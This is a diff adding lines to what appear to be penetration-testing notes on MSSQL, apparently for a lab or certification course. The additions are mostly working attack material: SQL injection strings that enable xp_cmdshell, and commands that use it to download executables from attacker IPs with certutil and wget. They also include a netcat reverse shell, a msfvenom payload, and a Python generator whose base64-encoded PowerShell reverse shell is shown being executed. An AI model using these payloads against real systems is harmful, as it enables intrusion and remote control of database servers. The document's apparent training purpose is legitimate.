@@ -351,6 +351,8 @@ Connect and Enable xp_cmdshell:
 kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 
 Enabling xp_cmdshell feature
+One-Liner: 1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
+
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 SQL> EXECUTE sp_configure 'show advanced options', 1;
 [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
@@ -368,10 +370,51 @@ SQL> EXECUTE xp_cmdshell 'whoami';
 output
 nt service\mssql$sqlexpress
 NULL
+
+' ORDER BY 1-- //  <----- Test for the amount of columns till you get an error
+' ORDER BY 1,2-- //
+' ORDER BY 1,2,3-- //  <---- Hits error so you know there are two columns
+
+' UNION SELECT 1,2; EXEC xp_cmdshell 'ping 192.168.45.173'--  <---- Ping  your machine to see if it goes through and you can contact it
+' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--  <----- Enable xp_cmdshell
+' UNION SELECT 1,2; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.173/80.exe C:\Users\Public\80.exe'--   <---- Download your revshell or netcat: msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o 80.exe   
+
+' UNION SELECT 1,2;EXEC xp_cmdshell 'powershell C:\Users\Public\80.exe'--//  <----- Execute your revshell or netcat
+
+admin' UNION SELECT 1,2; EXEC xp_cmdshell "powershell.exe wget http://192.168.45.236/nc.exe -OutFile c:\Windows\Tasks\nc.exe"--+
+admin' UNION SELECT 1,2; EXEC xp_cmdshell "c:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.236 443"--+
+
+' EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.173/80.exe C:\Users\Public\80.exe'--
+1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
+
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+SQL> reconfigure;
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> reconfigure
+
+One-Liner: 1';EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE--
+
+Generate a powershell base64 encoded reverse shell:
+python3 powershell_b64_encoded_revshell.py
+
+powershell_b64_encoded_revshell.py:
+
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.155",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+
+Execute the b64 encoded reverse shell with xp_cmdshell and powershell:
+SQL> xp_cmdshell powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMQA3ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
 
 
-
+```
 
 # Resources and tools that will help gain an upper hand on finding bugs :
 * Portswigger SQL Injection cheat sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet
